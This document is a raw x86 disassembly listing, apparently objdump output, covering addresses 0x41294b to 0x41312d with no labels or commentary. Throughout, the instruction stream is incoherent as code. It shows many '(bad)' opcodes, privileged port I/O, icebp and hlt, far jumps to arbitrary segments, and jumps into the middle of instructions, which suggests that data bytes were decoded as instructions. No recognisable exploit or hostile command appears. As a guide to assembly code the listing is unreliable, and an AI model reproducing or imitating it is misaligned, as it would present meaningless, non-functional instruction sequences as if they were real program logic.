  41294b:	cmp    DWORD PTR [ecx],ebp
  41294d:	jno    0x412980
  41294f:	xchg   ebx,eax
  412950:	mov    dh,0x6e
  412952:	nop
  412953:	(bad)  
  412954:	mov    ds:0x2546bf06,al
  412959:	push   ebp
  41295a:	leave  
  41295b:	daa    
  41295c:	loopne 0x412917
  41295e:	test   eax,0x417ed1b7
  412963:	daa    
  412964:	outs   dx,DWORD PTR ds:[esi]
  412965:	ret    0x11e2
  412968:	mov    cl,0x8e
  41296a:	inc    ebx
  41296b:	lods   eax,DWORD PTR ds:[esi]
  41296c:	imul   esi,DWORD PTR [ecx-0x6c71021a],0xffffff9d
  412973:	pop    eax
  412974:	cmp    eax,0x9a0174ee
  412979:	in     eax,0xde
  41297b:	test   BYTE PTR [edx],0x2
  41297e:	in     al,0x9d
  412980:	xor    DWORD PTR [eax+0x1d02b8ae],edi
  412986:	mov    esp,0x55cd109a
  41298b:	push   es
  41298c:	inc    esp
  41298d:	in     eax,0x15
  41298f:	retf   
  412990:	int3   
  412991:	xor    DWORD PTR [edx-0x2c3b6daf],ebp
  412997:	pop    ss
  412998:	pop    es
  412999:	bound  esi,QWORD PTR [ecx-0x135dc1ee]
  41299f:	xor    ah,BYTE PTR [eax+0x41]
  4129a2:	sbb    bh,dh
  4129a4:	test   eax,0x96221d6d
  4129a9:	scas   eax,DWORD PTR es:[edi]
  4129aa:	fcmovne st,st(7)
  4129ac:	(bad)  
  4129ad:	jle    0x4129f3
  4129af:	aas    
  4129b0:	adc    bl,bh
  4129b2:	jecxz  0x4129c4
  4129b4:	add    bh,BYTE PTR [esi]
  4129b6:	lahf   
  4129b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b8:	pushf  
  4129b9:	lea    esp,[ebp-0x5216d845]
  4129bf:	jmp    0xbc65ebb3
  4129c4:	xor    ch,BYTE PTR [edi-0x18aed574]
  4129ca:	dec    edi
  4129cb:	cmp    DWORD PTR [ebp+0x5f1fab02],esp
  4129d1:	push   0xfb95e28a
  4129d6:	stos   BYTE PTR es:[edi],al
  4129d7:	outs   dx,DWORD PTR ds:[esi]
  4129d8:	int    0x68
  4129da:	ins    DWORD PTR es:[edi],dx
  4129db:	lods   eax,DWORD PTR ds:[esi]
  4129dc:	mov    al,0xe9
  4129de:	cli    
  4129df:	fs inc esp
  4129e1:	mov    WORD PTR [eax+ecx*1],cs
  4129e4:	out    dx,al
  4129e5:	add    ah,0xc4
  4129e8:	ret    0x86d2
  4129eb:	dec    edx
  4129ec:	les    ebx,FWORD PTR [edi-0xb]
  4129ef:	je     0x412a3a
  4129f1:	rcl    eax,1
  4129f3:	jmp    0x4129d2
  4129f5:	mov    dl,0x73
  4129f7:	mov    bl,0xb1
  4129f9:	inc    ebx
  4129fa:	or     dl,BYTE PTR [ebp+0x21303d7d]
  412a00:	ror    DWORD PTR ds:0x34f1f11a,1
  412a06:	ss pushf 
  412a08:	and    bl,0x50
  412a0b:	jle    0x4129ac
  412a0d:	sub    al,0xcd
  412a0f:	jp     0x4129df
  412a11:	push   esp
  412a12:	ins    DWORD PTR es:[edi],dx
  412a13:	mov    dh,0xe5
  412a15:	ret    0xab1f
  412a18:	fisub  DWORD PTR [edi-0x423d5444]
  412a1e:	inc    edx
  412a1f:	jmp    0xb69d:0x62a43434
  412a26:	dec    esi
  412a27:	addr16 xor bl,al
  412a2a:	inc    esp
  412a2b:	mov    dl,0xb1
  412a2d:	mov    ah,0xe2
  412a2f:	pop    edx
  412a30:	adc    BYTE PTR [edx+0x339e0105],0xe2
  412a37:	jmp    0xb18634ab
  412a3c:	(bad)  
  412a3d:	test   eax,0x1cf9582b
  412a42:	stos   BYTE PTR es:[edi],al
  412a43:	push   0x6f
  412a45:	inc    esp
  412a46:	outs   dx,BYTE PTR ds:[esi]
  412a47:	retf   0xd59
  412a4a:	add    eax,0xd80d994c
  412a4f:	enter  0x66,0xb1
  412a53:	retf   
  412a54:	jmp    0x3c9c:0xe3dae07d
  412a5b:	test   BYTE PTR [ecx],ch
  412a5d:	(bad)  
  412a5e:	xchg   ebp,eax
  412a5f:	or     edx,DWORD PTR [eax+ecx*2-0xd]
  412a63:	pop    ds
  412a64:	pop    ebp
  412a65:	imul   ebp,DWORD PTR [ebp-0x7a],0x9d9b1605
  412a6c:	jmp    0xc5230894
  412a71:	fst    DWORD PTR [ecx*4-0x690efe34]
  412a78:	inc    edi
  412a79:	push   edx
  412a7a:	in     al,0xcd
  412a7c:	dec    ecx
  412a7d:	sbb    al,0x48
  412a7f:	sub    DWORD PTR [edi+0x14],edx
  412a82:	mov    ds:0x44c3b98d,eax
  412a87:	stos   BYTE PTR es:[edi],al
  412a88:	fisubr DWORD PTR [ebx]
  412a8a:	fnstenv [esi]
  412a8c:	in     eax,dx
  412a8d:	(bad)
  412a92:	iret   
  412a93:	sub    eax,0x6e8693d3
  412a98:	pop    ds
  412a99:	and    al,0x6a
  412a9b:	loope  0x412afd
  412a9d:	hlt    
  412a9e:	jo     0x412aeb
  412aa0:	or     BYTE PTR [edi+0xe],ch
  412aa3:	repz (bad) 
  412aa5:	gs mov ah,0xce
  412aa8:	cmp    BYTE PTR [esi],dh
  412aaa:	inc    ecx
  412aab:	and    al,0x57
  412aad:	xchg   ecx,eax
  412aae:	push   0xfffffff7
  412ab0:	in     eax,0x5e
  412ab2:	sub    DWORD PTR ds:0x59284c95,edi
  412ab8:	jge    0x412a64
  412aba:	jge    0x412acc
  412abc:	mov    al,0x7b
  412abe:	dec    esp
  412abf:	fcom   QWORD PTR [edi+0x26]
  412ac2:	test   DWORD PTR [edi],ebx
  412ac4:	fstp   TBYTE PTR [ecx]
  412ac6:	sbb    esp,DWORD PTR [ebp-0x15ed15dd]
  412acc:	or     al,0x91
  412ace:	adc    eax,0x87cd7f63
  412ad3:	jge    0x412aca
  412ad5:	jge    0x412a98
  412ad7:	or     al,0xa2
  412ad9:	clc    
  412ada:	add    bl,BYTE PTR [edi-0x20a91c18]
  412ae0:	lds    ebx,FWORD PTR [esi]
  412ae2:	push   ecx
  412ae3:	add    cl,bh
  412ae5:	les    eax,FWORD PTR [esi+0x52]
  412ae8:	mov    al,0xbc
  412aea:	or     ah,BYTE PTR [ecx-0x1ef47318]
  412af0:	scas   al,BYTE PTR es:[edi]
  412af1:	and    cl,BYTE PTR [edi+0x1c]
  412af4:	or     al,0xf7
  412af6:	jbe    0x412aea
  412af8:	dec    eax
  412af9:	mov    dl,0x8c
  412afb:	jo     0x412ace
  412afd:	rcl    DWORD PTR [eax],0x87
  412b00:	sub    ebp,DWORD PTR [ebp-0xa6ebff7]
  412b06:	adc    BYTE PTR [ecx],0xef
  412b09:	fmul   QWORD PTR [edx]
  412b0b:	fpatan 
  412b0d:	dec    edi
  412b0e:	stc    
  412b0f:	sub    al,0xc
  412b11:	das    
  412b12:	(bad)  
  412b13:	icebp  
  412b14:	jns    0x412b8e
  412b16:	push   0xacbc3a40
  412b1b:	or     cl,BYTE PTR [esi-0x11]
  412b1e:	stc    
  412b1f:	repnz inc ebp
  412b21:	retf   0x7a57
  412b24:	icebp  
  412b25:	sub    ecx,ecx
  412b27:	or     ch,al
  412b29:	ror    BYTE PTR [edx],cl
  412b2b:	pop    edx
  412b2c:	mov    ds:0x2717a568,al
  412b31:	out    dx,al
  412b32:	mov    ds:0xd86477e4,eax
  412b37:	js     0x412b5f
  412b39:	inc    edi
  412b3a:	ins    DWORD PTR es:[edi],dx
  412b3b:	pushw  ss
  412b3d:	data16 (bad) 
  412b3f:	test   al,0x36
  412b41:	loop   0x412b76
  412b43:	js     0x412bac
  412b45:	fucom  st(0)
  412b47:	(bad)
  412b4b:	je     0x412ba2
  412b4d:	jecxz  0x412ad8
  412b4f:	mov    bh,0x5
  412b51:	lea    ebx,[edi]
  412b53:	data16 addr16 (bad) 
  412b56:	jmp    0xad60898b
  412b5b:	ret    0x8ac2
  412b5e:	outs   dx,DWORD PTR ds:[esi]
  412b5f:	call   0x62a71121
  412b64:	retf   0xc70
  412b67:	jmp    0x15ec:0xf1dcc85a
  412b6e:	scas   eax,DWORD PTR es:[edi]
  412b6f:	pop    eax
  412b70:	jp     0x412baa
  412b72:	mov    dl,0x45
  412b74:	ss cmp eax,0xa155db6d
  412b7a:	mov    ah,0x23
  412b7c:	mov    ebp,0xaae7e4b
  412b81:	jnp    0x412b17
  412b83:	(bad)  
  412b84:	dec    ebx
  412b86:	cmc    
  412b87:	sbb    edi,esi
  412b89:	push   es
  412b8a:	adc    DWORD PTR [ebx],edx
  412b8c:	adc    eax,0xc3510dcb
  412b91:	lock xor al,0xa4
  412b94:	popa   
  412b95:	in     al,0x3e
  412b97:	sub    edx,edi
  412b99:	jmp    FWORD PTR [esi-0x5da54897]
  412b9f:	loop   0x412c10
  412ba1:	push   esp
  412ba2:	sub    edx,edi
  412ba4:	adc    ch,bh
  412ba6:	cmp    bh,dl
  412ba8:	sub    eax,0x2e171c
  412bad:	adc    ah,dl
  412baf:	cs and al,0x79
  412bb2:	push   edx
  412bb3:	pop    ss
  412bb4:	rol    DWORD PTR fs:[ecx],cl
  412bb7:	adc    bh,0xca
  412bba:	out    dx,al
  412bbb:	jecxz  0x412bd1
  412bbd:	leave  
  412bbe:	scas   al,BYTE PTR es:[edi]
  412bbf:	mov    edi,ecx
  412bc1:	mov    al,ds:0xec2ee42f
  412bc6:	lds    ebx,FWORD PTR [esi-0x8b14d9a]
  412bcc:	js     0x412bc9
  412bce:	sub    bh,BYTE PTR [eax+0x22d47739]
  412bd4:	mov    DWORD PTR [ecx+0x61],edx
  412bd7:	dec    esi
  412bd8:	ficomp WORD PTR [esi]
  412bda:	ins    DWORD PTR es:[edi],dx
  412bdb:	out    dx,eax
  412bdc:	repnz xor DWORD PTR [ebx+0x3df85a52],ebp
  412be3:	mov    esi,0xba7fdf72
  412be8:	mov    ebp,0xf4f2cf69
  412bed:	std    
  412bee:	ret    
  412bef:	mov    ah,0xfb
  412bf1:	icebp  
  412bf2:	iret   
  412bf3:	mov    eax,0x26282cab
  412bf8:	cwde   
  412bf9:	test   BYTE PTR [ecx-0x20],bl
  412bfc:	cli    
  412bfd:	xor    DWORD PTR [ebp+0x6b],edx
  412c00:	cli    
  412c01:	dec    edx
  412c02:	jae    0x412c47
  412c04:	jge    0x412c64
  412c06:	je     0x412c40
  412c08:	lds    ebx,FWORD PTR [esi+ebx*4+0x73fddb26]
  412c0f:	(bad)  
  412c10:	outs   dx,DWORD PTR ds:[esi]
  412c11:	test   BYTE PTR es:[edx],0x9f
  412c15:	dec    ebp
  412c16:	mov    al,0xa6
  412c18:	push   ebx
  412c19:	jne    0x412c4d
  412c1b:	jmp    0x16b76dc4
  412c20:	mov    ah,0xa6
  412c22:	jmp    0x6130a51d
  412c27:	dec    edx
  412c28:	push   0xffffffe3
  412c2a:	test   BYTE PTR [eax+0x2ea6c434],dl
  412c30:	push   edi
  412c31:	mov    esp,0x56d41af0
  412c36:	xchg   edi,eax
  412c37:	pop    eax
  412c38:	ret    
  412c39:	jp     0x412bff
  412c3b:	(bad)  
  412c3c:	push   esi
  412c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c3e:	dec    ebp
  412c3f:	rol    BYTE PTR [ebx],cl
  412c41:	sub    DWORD PTR [eax+0x5b],edx
  412c44:	xor    eax,0x7cebf6fb
  412c49:	xchg   edi,eax
  412c4a:	je     0x412cb1
  412c4c:	iret   
  412c4d:	test   eax,0xa15aa8b3
  412c52:	mov    ebp,0xdf1cb4eb
  412c57:	mov    ds:0x12709f62,al
  412c5c:	cmp    eax,0x10bd4698
  412c61:	adc    al,BYTE PTR [edi-0x273f3803]
  412c67:	mov    WORD PTR [esi],fs
  412c69:	loope  0x412ce2
  412c6b:	pop    edi
  412c6c:	mov    edx,0x19c50130
  412c71:	popa   
  412c72:	and    eax,0xb4a224b
  412c77:	(bad)  
  412c78:	jp     0x412c31
  412c7a:	retf   0x277
  412c7d:	push   es
  412c7e:	or     DWORD PTR gs:[ecx+0x7c],ecx
  412c82:	fdivr  QWORD PTR [edx+0x6c5e529f]
  412c88:	jge    0x412c85
  412c8a:	ret    
  412c8b:	mov    ch,0xea
  412c8d:	xchg   edx,eax
  412c8e:	in     eax,0x36
  412c90:	loopne 0x412d01
  412c92:	mul    BYTE PTR [edx+edx*8-0xce5516]
  412c99:	mov    dl,0x42
  412c9b:	mov    ah,0x4
  412c9d:	add    eax,0x8fa8a1a0
  412ca2:	imul   ecx,DWORD PTR [esi-0x74],0x79
  412ca6:	cmp    eax,0x5047ed32
  412cab:	stc    
  412cac:	mov    ch,0x38
  412cae:	fldenv [edi-0x78]
  412cb1:	bound  ebx,QWORD PTR [ebp+0x762b1ba2]
  412cb7:	mov    edx,0x6d06fc6c
  412cbc:	mov    esp,0xc4dca328
  412cc1:	mov    ecx,0xd63ae0af
  412cc6:	and    eax,0xc158d02e
  412ccb:	popa   
  412ccc:	adc    ebp,esi
  412cce:	mov    eax,ds:0x46638e65
  412cd3:	dec    ebp
  412cd4:	mov    al,0xd7
  412cd6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412cd8:	pop    eax
  412cd9:	xlat   BYTE PTR ds:[ebx]
  412cda:	or     DWORD PTR [eax-0x2cbe725e],edi
  412ce0:	mov    ah,0x98
  412ce2:	fcom   DWORD PTR [ebx]
  412ce4:	in     eax,dx
  412ce5:	fidiv  DWORD PTR fs:[edx]
  412ce9:	shr    DWORD PTR [edi-0x3f4011ec],1
  412cef:	int3   
  412cf0:	mov    cl,0xd9
  412cf2:	outs   dx,BYTE PTR ds:[esi]
  412cf3:	test   BYTE PTR [edx+0x65],bh
  412cf6:	ins    DWORD PTR es:[edi],dx
  412cf7:	mov    eax,0x5df91df7
  412cfc:	jp     0x412d5c
  412cfe:	sub    ah,BYTE PTR [eax-0x3b]
  412d01:	loope  0x412c9b
  412d03:	mov    bl,0x78
  412d05:	jp     0x412d81
  412d07:	pop    esi
  412d08:	pop    ebx
  412d09:	loope  0x412d41
  412d0b:	xor    al,BYTE PTR [eax-0x73]
  412d0e:	cld    
  412d0f:	test   dl,cl
  412d11:	mov    ecx,0x75a57a5e
  412d16:	ficomp WORD PTR [edx]
  412d18:	pop    esi
  412d19:	push   ebp
  412d1a:	into   
  412d1b:	push   cs
  412d1c:	fwait
  412d1d:	jle    0x412d49
  412d1f:	arpl   di,bp
  412d21:	mov    dh,0x6a
  412d23:	xor    ebp,esi
  412d25:	push   0x6ddb00ff
  412d2a:	das    
  412d2b:	ins    DWORD PTR es:[edi],dx
  412d2c:	push   cs
  412d2d:	retf   
  412d2e:	xlat   BYTE PTR ds:[ebx]
  412d2f:	aas    
  412d30:	adc    BYTE PTR ds:0x470dad6a,bl
  412d36:	ror    DWORD PTR [ebx+0x3c],1
  412d39:	out    dx,eax
  412d3a:	sti    
  412d3b:	repz or edx,DWORD PTR [ecx]
  412d3e:	or     al,0x7f
  412d40:	mov    BYTE PTR [edi+eax*1-0x41],dh
  412d44:	xor    bh,BYTE PTR ss:[edi]
  412d47:	and    DWORD PTR [ebp-0x27],0xffffffb2
  412d4b:	daa    
  412d4c:	or     DWORD PTR [eax-0x5e],eax
  412d4f:	push   0x3c
  412d51:	or     al,0x3
  412d53:	inc    eax
  412d54:	mov    WORD PTR [edx],fs
  412d56:	into   
  412d57:	ja     0x412d56
  412d59:	out    dx,al
  412d5a:	inc    ebx
  412d5b:	push   ebx
  412d5c:	imul   edi,DWORD PTR [esi-0x1f533be8],0xe0131c92
  412d66:	ins    DWORD PTR es:[edi],dx
  412d67:	retf   0x2bb0
  412d6a:	lock adc eax,0xe4de7b2e
  412d70:	pop    ebx
  412d71:	es push cs
  412d73:	retf   0x1ef6
  412d76:	icebp  
  412d77:	xchg   edi,eax
  412d78:	call   0x2eb4:0x92468c90
  412d7f:	jne    0x412daa
  412d81:	dec    ebx
  412d82:	int    0x0
  412d84:	lock mov ds:0xfe9daa48,al
  412d8a:	ds or  al,0x89
  412d8d:	push   ds
  412d8e:	ds nop
  412d90:	mov    cl,0xe
  412d92:	dec    ecx
  412d93:	sbb    ebx,DWORD PTR [ecx]
  412d95:	mov    cs,WORD PTR [edx+eax*8]
  412d98:	sbb    DWORD PTR [ecx-0x5b],edi
  412d9b:	or     ebx,DWORD PTR [edx]
  412d9d:	pop    esp
  412d9e:	cwde   
  412d9f:	pushf  
  412da0:	xchg   edi,eax
  412da1:	sbb    eax,0x1a68a4f6
  412da6:	jno    0x412dfe
  412da8:	repz pop edx
  412daa:	push   edx
  412dab:	call   0x8b52d006
  412db0:	sti    
  412db1:	test   eax,0x9573c152
  412db6:	pop    ss
  412db7:	lea    esp,[eax+0x23]
  412dba:	icebp  
  412dbb:	xor    al,BYTE PTR [edx+0x1d54fae8]
  412dc1:	gs jbe 0x412e17
  412dc4:	popf   
  412dc5:	xchg   edx,eax
  412dc6:	std    
  412dc7:	imul   BYTE PTR [esi+0x23263006]
  412dcd:	sub    eax,0xf81f2b15
  412dd2:	rol    DWORD PTR [eax+0x686c279b],0xd
  412dd9:	iret   
  412dda:	sti    
  412ddb:	mov    edi,0x394616db
  412de0:	clc    
  412de1:	mov    edx,0x6e9de971
  412de6:	loope  0x412e57
  412de8:	dec    eax
  412de9:	and    edx,DWORD PTR [ebx]
  412deb:	fcomp  st(4)
  412ded:	jle    0x412dec
  412def:	jmp    0x412df2
  412df1:	in     al,dx
  412df2:	cmc    
  412df3:	mov    esp,0x41f8780f
  412df8:	mov    eax,0x42f115d8
  412dfd:	xor    ah,dl
  412dff:	jecxz  0x412ddf
  412e01:	mov    dh,0xc9
  412e03:	xchg   edi,eax
  412e04:	(bad)  
  412e05:	(bad)  
  412e06:	cs out 0x8d,eax
  412e09:	mov    ebp,0x1dad0114
  412e0e:	pop    eax
  412e0f:	sub    eax,0x727e1bd7
  412e14:	out    dx,eax
  412e15:	cmp    BYTE PTR [esi+0x7c],dl
  412e18:	cmp    esp,DWORD PTR [edx]
  412e1a:	adc    al,ah
  412e1c:	push   edi
  412e1d:	aam    0x5a
  412e1f:	and    edi,esi
  412e21:	popf   
  412e22:	ss lock push cs
  412e25:	test   al,0xae
  412e27:	stos   DWORD PTR es:[edi],eax
  412e28:	stc    
  412e29:	(bad)  
  412e2a:	hlt    
  412e2b:	mov    edi,0x8ebf6d9b
  412e30:	enter  0x3445,0xa3
  412e34:	idiv   edi
  412e36:	fistp  WORD PTR [eax-0x2eb6e607]
  412e3c:	fidivr WORD PTR [eax+0x2e]
  412e3f:	jnp    0x412e69
  412e41:	stos   DWORD PTR es:[edi],eax
  412e42:	xchg   ebp,eax
  412e43:	repz jo 0x412e7e
  412e46:	sbb    esi,DWORD PTR [edx]
  412e48:	inc    edx
  412e49:	mul    DWORD PTR [ebp+0x29]
  412e4c:	xchg   edi,eax
  412e4d:	jbe    0x412dfa
  412e4f:	add    esi,ebp
  412e51:	jmp    0x1f64c699
  412e56:	daa    
  412e57:	fs inc ebp
  412e59:	int    0x53
  412e5b:	xor    al,BYTE PTR [eax-0x10]
  412e5e:	outs   dx,DWORD PTR ds:[esi]
  412e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e60:	je     0x412e43
  412e62:	call   edx
  412e64:	test   al,0x3c
  412e66:	loop   0x412ed7
  412e68:	sub    BYTE PTR [edx],ch
  412e6a:	loop   0x412e63
  412e6c:	rol    bh,cl
  412e6e:	int    0x77
  412e70:	shl    DWORD PTR [ebx+0x37c93d48],1
  412e76:	cmc    
  412e77:	mov    BYTE PTR ds:0x909b4227,dl
  412e7d:	dec    ebp
  412e7e:	ins    BYTE PTR es:[edi],dx
  412e7f:	std    
  412e80:	sbb    cl,dl
  412e82:	dec    esi
  412e83:	cld    
  412e84:	icebp  
  412e85:	and    bh,al
  412e87:	cmp    eax,0x8da7eefc
  412e8c:	mov    ds:0xcf4f24b,al
  412e91:	loop   0x412e9f
  412e93:	add    ecx,DWORD PTR [esi]
  412e95:	dec    esi
  412e96:	scas   al,BYTE PTR es:[edi]
  412e97:	inc    esi
  412e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e9a:	in     al,0x65
  412e9c:	aad    0xa4
  412e9e:	repz test al,0xba
  412ea1:	xor    DWORD PTR ds:0xa9d5ae83,eax
  412ea7:	adc    al,0x48
  412ea9:	push   eax
  412eaa:	mov    esi,0xedb36a23
  412eaf:	in     eax,0x16
  412eb1:	retf   
  412eb2:	cli    
  412eb3:	xchg   esi,eax
  412eb4:	(bad)  
  412eb5:	in     al,dx
  412eb6:	pop    ebp
  412eb7:	outs   dx,DWORD PTR ds:[esi]
  412eb8:	inc    esi
  412eb9:	stos   DWORD PTR es:[edi],eax
  412eba:	lds    eax,FWORD PTR [edi-0x51206d83]
  412ec0:	dec    ecx
  412ec1:	repz cmp bh,BYTE PTR [eax]
  412ec4:	push   ds
  412ec5:	inc    edx
  412ec6:	pushf  
  412ec7:	xchg   ecx,eax
  412ec8:	loope  0x412f39
  412eca:	and    BYTE PTR [ecx+0x3aeea14d],dl
  412ed0:	fimul  WORD PTR [esp+ecx*2+0x6f]
  412ed4:	pushf  
  412ed5:	hlt    
  412ed6:	push   ss
  412ed7:	test   eax,0x8df7a3a
  412edc:	arpl   WORD PTR [eax],ax
  412ede:	in     eax,0x2b
  412ee0:	es cs xor bx,si
  412ee5:	jge    0x412f46
  412ee7:	or     BYTE PTR [ebx-0x5d],bl
  412eea:	ss inc edi
  412eec:	mov    WORD PTR [edx-0x6cc8f31e],?
  412ef2:	out    0x39,eax
  412ef4:	fbstp  TBYTE PTR [edx]
  412ef6:	out    0x98,eax
  412ef8:	mov    bh,bh
  412efa:	fwait
  412efb:	shr    eax,0xae
  412efe:	cmp    al,0x19
  412f00:	imul   ecx,DWORD PTR [esi-0x80],0x6011610d
  412f07:	mov    eax,es:0x1e534767
  412f0d:	hlt    
  412f0e:	sbb    eax,0x797c831b
  412f13:	pop    es
  412f14:	add    bh,BYTE PTR [ebx]
  412f16:	inc    edx
  412f17:	(bad)  
  412f18:	push   edi
  412f19:	jae    0x412ef1
  412f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f1c:	(bad)  
  412f1d:	mov    edx,0xfcd58f4a
  412f22:	push   ds
  412f23:	ds jp  0x412eaa
  412f26:	call   0xf45d:0xa6074c27
  412f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f2e:	dec    ecx
  412f2f:	sub    eax,0xe9659fcf
  412f34:	and    BYTE PTR [eax+0x51c4de65],ah
  412f3a:	scas   al,BYTE PTR es:[edi]
  412f3b:	sbb    ah,ch
  412f3d:	mov    al,ds:0xc36935ea
  412f42:	jae    0x412efb
  412f44:	shl    dh,0x15
  412f47:	test   eax,0x3050ddc6
  412f4c:	push   ebp
  412f4d:	dec    edi
  412f4e:	rcl    DWORD PTR [ecx],cl
  412f50:	xchg   edi,eax
  412f51:	shl    BYTE PTR [esi],1
  412f53:	sub    al,0xc4
  412f55:	je     0x412fba
  412f57:	cmp    BYTE PTR [eax-0x2a],dl
  412f5a:	outs   dx,DWORD PTR ds:[esi]
  412f5b:	ja     0x412f09
  412f5d:	cmp    esi,edx
  412f5f:	test   eax,0x8eb86bd3
  412f64:	cmp    bl,0xc1
  412f67:	je     0x412f99
  412f69:	aad    0x19
  412f6b:	or     DWORD PTR [esi+0x588d17d6],eax
  412f71:	ror    BYTE PTR [esi+0x12],0xba
  412f75:	test   BYTE PTR [ecx-0x2a],dh
  412f78:	jmp    DWORD PTR [eax-0x11]
  412f7b:	xchg   ebp,eax
  412f7c:	xor    DWORD PTR [ebp+0x20cdacd2],0x71
  412f83:	pop    edx
  412f84:	sub    al,0xb3
  412f86:	adc    ecx,eax
  412f88:	inc    ebx
  412f89:	xchg   esi,eax
  412f8a:	inc    ebx
  412f8b:	int3   
  412f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f8d:	push   eax
  412f8e:	dec    esi
  412f8f:	fldenv [ebx+0x6a]
  412f92:	add    BYTE PTR [ebx+0x355c8794],ch
  412f98:	arpl   WORD PTR [eax-0x71],dx
  412f9b:	mov    ds,WORD PTR [edx+0x6]
  412f9e:	stc    
  412f9f:	add    esi,DWORD PTR [ebp+0x74]
  412fa2:	mov    edi,0xd4a163b
  412fa7:	xor    esi,ebp
  412fa9:	push   esp
  412faa:	dec    eax
  412fab:	sbb    DWORD PTR [ecx],ebp
  412fad:	xchg   esp,eax
  412fae:	mov    ds:0xa1fb0096,al
  412fb3:	out    0x8a,eax
  412fb5:	lahf   
  412fb6:	cs scas al,BYTE PTR es:[edi]
  412fb8:	cmp    DWORD PTR [eax-0x54456999],0x23
  412fbf:	mov    al,0xe
  412fc1:	mov    eax,0x3bbff7f3
  412fc6:	xchg   edi,eax
  412fc7:	pop    eax
  412fc8:	dec    edi
  412fc9:	cmc    
  412fca:	cmc    
  412fcb:	mov    ch,0xa5
  412fcd:	rcl    BYTE PTR [ebp+0x6d197791],1
  412fd3:	ins    DWORD PTR es:[edi],dx
  412fd4:	and    eax,DWORD PTR [eax-0x47]
  412fd7:	jge    0x412f9f
  412fd9:	inc    ebp
  412fda:	cmp    DWORD PTR [ecx+0x318637b3],ecx
  412fe0:	mov    fs,WORD PTR [esp+eiz*8-0xf9851f]
  412fe7:	call   0xccdbf0b9
  412fec:	xor    DWORD PTR [edx+0x52601658],esp
  412ff2:	mov    al,0x44
  412ff4:	imul   eax,DWORD PTR [esp+edx*4+0x594010b7],0xa809f5e8
  412fff:	and    edi,ebp
  413001:	sbb    eax,0x84cc06c8
  413006:	sub    BYTE PTR [ecx],dl
  413008:	lds    edi,FWORD PTR [eax-0xa6c4fc4]
  41300e:	adc    DWORD PTR [esi+0x1f],ebp
  413011:	(bad)  [eax]
  413013:	outs   dx,DWORD PTR ds:[esi]
  413014:	add    DWORD PTR [esi],ebx
  413016:	lods   al,BYTE PTR ds:[esi]
  413017:	rcr    BYTE PTR [edx],0xf8
  41301a:	shr    BYTE PTR [esi-0x31],1
  41301d:	adc    eax,0xb87369d2
  413022:	cmp    dl,BYTE PTR [esi-0x194dc39f]
  413028:	adc    ebp,ebp
  41302a:	xor    ecx,DWORD PTR [edx-0x44c92825]
  413030:	xchg   ebx,eax
  413031:	arpl   sp,di
  413033:	push   ebp
  413034:	xor    DWORD PTR [ecx-0x7936db95],0xcc18dc4c
  41303e:	sbb    DWORD PTR [eax],eax
  413040:	(bad)  
  413042:	fbld   TBYTE PTR [ecx+edi*2+0x421de63d]
  413049:	and    ebp,edx
  41304b:	push   ds
  41304c:	push   es
  41304d:	push   0x69b7c35c
  413052:	mov    ds:0x8463572e,al
  413057:	and    BYTE PTR [edi-0x698ab280],0x3e
  41305e:	mov    al,ds:0x81e4fcfb
  413063:	lds    esp,FWORD PTR ds:0xe1e6ad7e
  413069:	daa    
  41306a:	sbb    al,0xcf
  41306c:	jae    0x412ff2
  41306e:	call   FWORD PTR [ebx-0x615611d5]
  413074:	(bad)  
  413075:	jno    0x41304a
  413077:	addr16 jmp 0x4130a1
  41307a:	(bad)  
  41307b:	and    DWORD PTR [esi-0x7c],ecx
  41307e:	xchg   edi,eax
  41307f:	mov    fs,WORD PTR [esi+eiz*8]
  413082:	add    BYTE PTR [ecx-0x3c1423d8],bl
  413088:	cdq    
  413089:	ficom  WORD PTR [ebx]
  41308b:	xchg   edi,eax
  41308c:	mov    ebx,0xa599e600
  413091:	inc    ecx
  413092:	jae    0x413049
  413094:	cmp    BYTE PTR [ecx+esi*4],ah
  413097:	sbb    dl,BYTE PTR [ebp+0x5a03a768]
  41309d:	xchg   BYTE PTR [ebp*2-0x3b384fce],bh
  4130a4:	xchg   DWORD PTR [edx-0x3b037845],ebx
  4130aa:	shl    DWORD PTR [ebp+ebx*4-0x47ef37e8],1
  4130b1:	stos   BYTE PTR es:[edi],al
  4130b2:	mov    edx,0x3e5f7481
  4130b7:	adc    ebp,DWORD PTR [eax-0x76b98efe]
  4130bd:	daa    
  4130be:	cmp    ah,BYTE PTR [esi+0x25]
  4130c1:	sbb    al,0x89
  4130c3:	and    al,0xc1
  4130c5:	pop    ds
  4130c6:	add    DWORD PTR [edi-0x2f9e2088],ebx
  4130cc:	mov    ds:0x94ea6836,al
  4130d1:	or     ah,dh
  4130d3:	rcr    BYTE PTR ds:0xf8a665bf,cl
  4130d9:	adc    DWORD PTR [eax-0x1c3ef6b],ecx
  4130df:	inc    ebp
  4130e0:	es sub edi,ecx
  4130e3:	cmp    dh,dl
  4130e5:	les    eax,FWORD PTR [ebp-0x54]
  4130e8:	jmp    0x413074
  4130ea:	leave  
  4130eb:	outs   dx,BYTE PTR ds:[esi]
  4130ec:	cmp    BYTE PTR [ecx-0x52],al
  4130ef:	and    DWORD PTR [esi+0x58],ecx
  4130f2:	jg     0x413125
  4130f4:	xchg   edi,eax
  4130f5:	xor    bh,BYTE PTR [ebp-0x3a77ee34]
  4130fb:	sbb    eax,0x2348b499
  413100:	xor    DWORD PTR [ebx],0xbf63932
  413106:	and    BYTE PTR [ecx],al
  413108:	adc    DWORD PTR [eax],esp
  41310a:	pop    esp
  41310b:	data16 adc al,0x31
  41310e:	dec    edi
  41310f:	fsub   QWORD PTR [ecx-0x527ff4a3]
  413115:	add    DWORD PTR ds:0x865803f7,eax
  41311b:	repnz sub DWORD PTR [edi],0xffffffe1
  41311f:	dec    esp
  413120:	jb     0x4130a6
  413122:	inc    esp
  413123:	shl    cl,0xa4
  413126:	inc    edi
  413127:	push   eax
  413128:	dec    ebp
  413129:	adc    bl,al
  41312b:	loopne 0x413197
  41312d:	fst    DWORD PTR [esp+edi*8]
